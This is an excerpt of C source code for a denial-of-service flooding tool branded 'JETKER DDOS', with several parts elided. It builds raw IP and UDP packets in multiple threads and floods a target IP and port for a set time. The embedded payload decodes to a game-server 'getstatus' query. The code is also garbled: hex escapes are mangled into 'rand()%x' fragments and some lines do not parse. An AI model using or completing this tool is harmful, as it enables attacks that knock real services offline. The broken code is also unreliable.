...
if(strcmp(host, "127.0.0.1") != 0){
 ...
 iph->version = 4;
 iph->tos = 0;
 iph->tot_len = sizeof(struct iphdr) + rand()%1500+64 sizeof(struct
udphdr) - 64;
...
void *flood(void *par1)
{
 ...
 fprintf(stdout, "JETKER... %d STARTED\n", td->thread_id);
...
replStr("\rand()%xff\rand()%xff\rand()%xff\rand()%xff\rand()%x67\rand(
)%x65\rand()%x74\rand()%x73\rand()%x74\rand()%x61\rand()%x74\rand()%x7
5\rand()%x73\rand()%x0a", td->pks);
 udph->len=htons(rand()%(1500+64)-64;
 iph->tot_len += td->pks;
...
{
 if(argc < 6){
 fprintf(stderr, "JETKER .....\n");
 fprintf(stdout, "JETKER DDOS\nUsage: %s <IP> <PORT> <TTL>
<THREADS> <PACKET> <TIME>\n", argv[0]);
 exit(-1);
 }
 fprintf(stdout, "SETING BY JETKER 
